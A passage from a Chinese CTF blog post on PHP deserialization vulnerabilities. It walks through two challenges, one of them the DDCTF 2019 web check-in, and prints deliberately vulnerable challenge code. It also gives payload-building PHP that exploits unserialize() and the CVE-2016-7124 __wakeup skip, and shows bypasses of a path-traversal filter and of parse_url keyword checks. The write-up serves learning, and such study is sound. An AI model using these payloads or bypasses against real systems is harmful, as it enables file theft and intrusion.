+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hint.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  <span class="comment">//__destruct中被调用从而调用getFlag()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123; <span class="comment">//循环打印，赋值为空</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag(); <span class="comment">//调用 Flag 类里面的getFlag方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));  <span class="comment">//一到一万产生的随机数经过md5加密</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;  <span class="comment">//被handle调用</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)  <span class="comment">//两者必须相等</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$echof = <span class="keyword">new</span> Flag();</span><br><span class="line">$Flag-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line">$echoflag = <span class="keyword">new</span> Handle($echof);</span><br><span class="line"><span class="keyword">echo</span> serialize($echoflag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在粗略的看了一下两个文件之后，可能会有点乱（当时的我头脑是很乱的），但是我们只需要明确我们打CTF的目的就是拿到flag…</p>
+<p>梳理一下思路如下</p>
+<p><strong>index.php文件干了什么事？</strong><br>GET型传入两个参数 （那么传入的两个参数一定是有用的，通常出题人不会闲得蛋疼多设置几个没用的参数<br>file不能包含flag关键字<br>如果设置了payload的话，url被切割，且循环遍历匹配flag关键字，匹配到了就退出<br>payload被unserialize()了<del>payload被unserialize()了</del>payload被unserialize()了~</p>
+<p><strong>hint.php文件干了什么事？</strong><br>既然都叫hint.php了那么hint.php一定大有作为…<br>纵观 hint.php 包含两个类<br>其中的一个类叫 Flag，甚至类里有个方法叫getFlag()，所以我们明确我们的目标就是它</p>
+<p>打CTF一定要知道自己在干什么，所以先不管其他的，我们只谈反序列化，然后构造payload这个参数</p>
+<p>所以在抛弃一切前提下，我们甚至可以构造payload出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//假装有两个class </span></span><br><span class="line"><span class="class"><span class="keyword">class</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$echof = <span class="keyword">new</span> Flag();</span><br><span class="line">$Flag-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line">$echoflag = <span class="keyword">new</span> Handle($echof);</span><br><span class="line"><span class="keyword">echo</span> serialize($echoflag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在的我们已经能够输出flag了，我们看一下还存在哪些障碍？</p>
+<p><strong>输出flag的前提</strong><br><code>echo @highlight_file($this-&gt;file,true);</code>前有一个判断：<code>$this-&gt;token === $this-&gt;token_flag</code><br>而 <code>$this-&gt;token</code> 的值是不会变的，但是 <code>$this-&gt;token_flag</code>却会改变<br>这里有两种思路，其一是爆破，其二是用引用变量来解决这个问题 <code>$Flag-&gt;token = &amp;$Flag-&gt;token_flag;</code></p>
+<p><strong>__wakeup()每次打印为空？</strong><br>重点到了，利用本文前面的<strong>CVE-2016-7124</strong>。当成员属性数目<strong>大于</strong>实际数目时会跳过__wakeup的执行。这样能让 Handle类成功调用 Flag类中的方法</p>
+<p><strong>我们的关键词不能有flag？</strong><br>经过反序列化也罢，我们的关键词始终会含有flag词语，会被正则匹配到…<br>这里可以使用parse_url的解析漏洞，具体的可以看看 <a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">一叶飘零师傅的文章</a> 和 <a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">另一位师傅的文章</a><br>大概是parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。<br>所以使用三个斜线的话就不会被检测到关键词</p>
+<p>其实其他考点都是可以绕过的，最主要的反序列化思想的核心，我认为经过反序列化，有了可以控制的参数之后，就一定要完成某部分的功能，不是为了反序列化而反序列化</p>
+<h2 id="DDCTF-Web签到题"><a href="#DDCTF-Web签到题" class="headerlink" title="DDCTF-Web签到题"></a>DDCTF-Web签到题</h2><p>题目地址：<a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a></p>
+<p>经过信息泄露，抓包等会拿到两个源码…</p>
+<ul>
+<li><strong>文件1：Application.php</strong></li>
+</ul>
+<p>代码太长了，简化一下有用的功能如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>*<em>文件一大概是对 <code>$path</code> 变量做了一些处理；如：前后去空，并且移除了 <code>../</code>和 <code>..\</code> *</em></p>
+<p><strong>如果长度小于18的话能够读取 <code>$path</code> 变量的文件的内容,能够读取 <code>$path</code> 变量的文件的内容,能够读取 <code>$path</code> 变量的文件的内容</strong></p>
+<p>因此我们构造初步的payload （其实结合了一些文件2的信息才能构造路径）为：<code>../config/flag.txt</code>,但是此时需要绕过文件一中的一个 <code>str_replace()</code> 函数，且长度要小于18，故而再次构造为 <code>..././config/flag.txt</code> (需要注意的是此刻的长度虽然是21，但是经过一次前面的 <code>str_replace（）</code> 替换 <code>../</code> 为空之后，长度就刚好为18</p>
+<ul>
+<li><strong>文件2：app/Session.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//url:app/Session.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;	<span class="comment">//包含文件一</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;	</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span>		</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;	<span class="comment">//通过parent::调用父类方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;	</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);	<span class="comment">//flag可能也在这个文件夹里面</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;	</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;	</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;	</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];	</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;	</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);	</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);	</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;	</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);	<span class="comment">//通过parent::调用父类方法</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;	</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);	<span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;	<span class="comment">//POST的不为空</span></span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;	<span class="comment">//打印变量</span></span><br><span class="line">                $data = sprintf($data,$v);	<span class="comment">//输出</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);	<span class="comment">//序列化</span></span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们回顾一下反序列化执行的方法：</p>
+<ol>
+<li>必须有 unserailize() 函数，</li>
+<li>unserailize() 函数的参数必须可控</li>
+</ol>
+<p>首先映入眼帘的是文件二中第55行的 <code>$session = unserialize($session);</code> 这一步执行了危险函数 <code>unserialize()</code></p>
+<p>文件一被包含进文件二，因此可以利用文件一中 <code>__destruct()</code>来执行文件读取的功能。</p>
+<p>结合有用的信息，就是通过 session 的反序列化来控制 <code>$path</code> 变量进而得到 flag，第34行的注释<code>//eancrykey  and flag under the folder</code>提供了相应的位置</p>
+<p>因此我们通过控制 <code>$path</code> 变量可以获取到flag，控制 <code>$path</code> 需要通过反序列化。</p>
+<p>但是这道题还有其他的考点，因为需要伪造一个cookie才能拿到相应的 key 才能进行反序列化。</p>
+<p>因为单谈反序列化，所以我们简化一下本题。构造最终payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Application();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>想看完整wp的可以移步 <a href="https://www.anquanke.com/post/id/178434#h2-1" target="_blank" rel="noopener">DDCTF2019官方Write Up</a></p>
+<h1 id="反序列化还有什么？"><a href="#反序列化还有什么？" class="headerlink" title="反序列化还有什么？"></a>反序列化还有什么？</h1><p>下面两个因为也只是略懂，还没有深入研究，所以就不继续写了，附上两篇当初学习的文章</p>
+<p>Session反序列化漏洞：<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p>phar 拓展 php 反序列化漏洞攻击面：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+<ul>
+<li>本文参考自：<ul>
+<li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></li>
+<li><a href="https://xz.aliyun.com/t/1684" target="_blank" rel="noopener">https://xz.aliyun.com/t/1684</a></li>
+<li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>P2hm1n</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://p2hm1n.github.io/2019/06/29/入门Web需要知道的PHP反序列化漏洞/" title="入门Web需要知道的PHP反序列化漏洞">https://p2hm1n.github.io/2019/06/29/入门Web需要知道的PHP反序列化漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/19/实验吧-Writeup/" rel="next" title="实验吧 Writeup">
